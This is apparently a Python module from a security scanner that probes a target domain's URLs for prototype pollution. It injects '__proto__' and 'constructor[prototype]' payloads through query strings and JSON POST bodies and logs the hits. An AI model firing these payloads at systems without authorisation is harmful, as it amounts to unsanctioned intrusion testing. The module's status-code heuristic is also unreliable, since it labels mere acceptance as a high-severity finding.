"""
modules/prototype_pollution.py
------------------------------
Client & Server-side Prototype Pollution detection.
Targets JavaScript-heavy apps and Node.js/Express backends.
"""

import json
import re
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("prototype_pollution")


# ─────────────────────────────────────────
# Server-side payloads
# ─────────────────────────────────────────
SERVER_PAYLOADS = [
    {"__proto__": {"polluted": "yes"}},
    {"constructor": {"prototype": {"polluted": "yes"}}},
    {"__proto__.polluted": "yes"},
    {"constructor[prototype][polluted]": "yes"},
]

QUERY_PAYLOADS = [
    "__proto__[polluted]=yes",
    "__proto__.polluted=yes",
    "constructor[prototype][polluted]=yes",
    "constructor.prototype.polluted=yes",
]


def test_json_body(url: str, payload: Dict) -> Optional[Dict]:
    """Send JSON body with pollution payload."""
    r = safe_request(url, method="POST",
                     headers={"Content-Type": "application/json"},
                     data=json.dumps(payload), timeout=10)
    if not r:
        return None
    if r.status_code in (200, 201, 202):
        return {
            "type": "prototype_pollution_server",
            "url": url,
            "payload": json.dumps(payload)[:200],
            "evidence": f"Accepted with status {r.status_code}",
            "severity": "high",
            "confidence": 40,
        }
    return None


def test_query_string(url: str) -> Optional[Dict]:
    """Inject pollution via query string."""
    p = urlparse(url)
    for payload in QUERY_PAYLOADS:
        sep = "&" if p.query else ""
        new_query = p.query + sep + payload
        new_url = urlunparse((p.scheme, p.netloc, p.path,
                              p.params, new_query, ""))
        r = safe_request(new_url, timeout=10)
        if r and r.status_code == 200:
            if "polluted" in (r.text or ""):
                return {
                    "type": "prototype_pollution_client",
                    "url": new_url,
                    "payload": payload,
                    "evidence": "'polluted' reflected in response",
                    "severity": "medium",
                    "confidence": 55,
                }
    return None


def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "prototype_pollution", output_root)
    urls = load_urls(domain, output_root)
    if not urls:
        return {"count": 0, "findings": []}

    # Heuristic: pick URLs likely accepting JSON
    api_urls = [u for u in urls if any(k in u.lower() for k in
                ["/api/", "/v1/", "/v2/", "/graphql", "/rest/"])]
    if not api_urls:
        api_urls = urls[:30]

    info(f"Testing {len(api_urls)} URLs for prototype pollution")
    findings: List[Dict] = []

    for url in api_urls[:50]:
        try:
            # Query-string attempt
            res = test_query_string(url)
            if res:
                findings.append(res)
                save_finding(domain, "prototype_pollution", res["type"],
                             res["severity"], res["url"], payload=res["payload"],
                             evidence=res["evidence"], confidence=res["confidence"],
                             scan_id=scan_id, output_root=output_root)
            # JSON body attempt (POST)
            for payload in SERVER_PAYLOADS:
                res = test_json_body(url, payload)
                if res:
                    findings.append(res)
                    save_finding(domain, "prototype_pollution",
                                 "prototype_pollution_server", "high",
                                 res["url"], payload=res["payload"],
                                 evidence=res["evidence"], confidence=40,
                                 scan_id=scan_id, output_root=output_root)
                    break
        except Exception as e:
            log.debug(f"proto pollute check failed {url}: {e}")

    if findings:
        write_lines(mdir / "prototype_pollution_findings.txt",
                    [f"[{f['severity']}] {f['type']} → {f['url']}" for f in findings])

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "prototype_pollution", run, args.output)